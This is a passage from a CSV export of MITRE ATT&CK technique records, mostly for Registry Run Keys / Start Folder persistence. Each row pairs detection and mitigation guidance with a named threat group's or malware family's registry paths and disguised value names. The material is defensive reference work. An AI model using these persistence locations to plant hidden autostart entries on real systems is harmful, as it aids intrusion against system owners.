'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],"['Defense Evasion', 'Persistence']",['Technique/T1108'],['Redundant Access'],https://attack.mitre.org/wiki/Technique/T1108
1163,[],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems']",[],[],[],['The [[Group/G0020|Equation]] group is known to have the capability to overwrite the firmware on hard drives from some manufacturers.[[CiteRef::Kaspersky Equation QA]]'],['Equation'],['Equation'],['G0020'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['SYSTEM'],['Ability to update component device firmware from the host operating system.'],[],"['Defense Evasion', 'Persistence']",['Technique/T1109'],['Component Firmware'],https://attack.mitre.org/wiki/Technique/T1109
1164,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['A dropper used by [[Group/G0024|Putter Panda]] installs itself into the ASEP Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> with a value named McUpdate.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1165,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['Most [[Software/S0074|Sakula]] samples maintain persistence by setting the Registry Run key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> in the HKLM or HKCU hive, with the Registry value and file name varying by sample.[[CiteRef::Dell Sakula]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: Sakula, Sakurel, VIPER",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1166,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0080|Mivast]] creates the following Registry entry: <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia</code>.[[CiteRef::Symantec Backdoor.Mivast]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Mivast,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1167,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['[[Software/S0145|POWERSOURCE]] achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.[[CiteRef::Cisco DNSMessenger March 2017]]']",['FIN7'],['FIN7'],['G0046'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: POWERSOURCE, DNSMessenger",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1168,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0046|FIN7]] malware has created a Registry Run key pointing to its malicious LNK file to establish persistence.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1169,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0147|Pteranodon]] copies itself to the Startup folder to establish persistence.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Pteranodon,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1170,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",[u'[[Software/S0070|HTTPBrowser]] has established persistence by setting the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key value for <code>wdm</code> to the path of the executable.[[CiteRef::ThreatStream Evasion Analysis]] It has also used the Registry entry <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \u201c%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\u201d</code> to establish persistence.[[CiteRef::ZScaler Hacking Team]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: HTTPBrowser, Token Control, HttpDump",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1171,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0124|Pisloader]] establishes persistence via a Registry Run key.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Pisloader,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1172,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0128|BADNEWS]] installs a registry Run key to establish persistence.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: BADNEWS,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1173,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0131|TINYTYPHON]] installs itself under Registry Run key to establish persistence.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: TINYTYPHON,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1174,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0004|TinyZBot]] can create a shortcut in the Windows startup folder for persistence.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: TinyZBot,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1175,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0044|JHUHUGIT]] has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: JHUHUGIT, Seduploader, ...",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1176,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0045|ADVSTORESHELL]] achieves persistence by adding itself to the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.[[CiteRef::Kaspersky Sofacy]][[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: ADVSTORESHELL, NETUI, ...",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1177,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['[[Software/S0136|USBStealer]] registers itself under a Registry Run key with the name ""USB Disk Security.""[[CiteRef::ESET Sednit USBStealer 2014]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1178,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['[[Software/S0137|CORESHELL]] has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.[[CiteRef::Microsoft SIR Vol 19]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: CORESHELL, SOURFACE",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1179,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['[[Software/S0148|RTM]] tries to add a Registry Run key under the name ""Windows Update"" to establish persistence.[[CiteRef::ESET RTM Feb 2017]]']",['RTM'],['RTM'],['G0048'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: RTM,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1180,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0013|PlugX]] can add a Run key entry in the Registry to establish persistence.[[CiteRef::Lastline PlugX Analysis]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['DragonOK'],['DragonOK'],['G0017'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: PlugX, Sogu, Kaba",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1181,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['If establishing persistence by installation as a new service fails, one variant of [[Software/S0081|Elise]] establishes persistence for the created .exe file by setting the following Registry key: 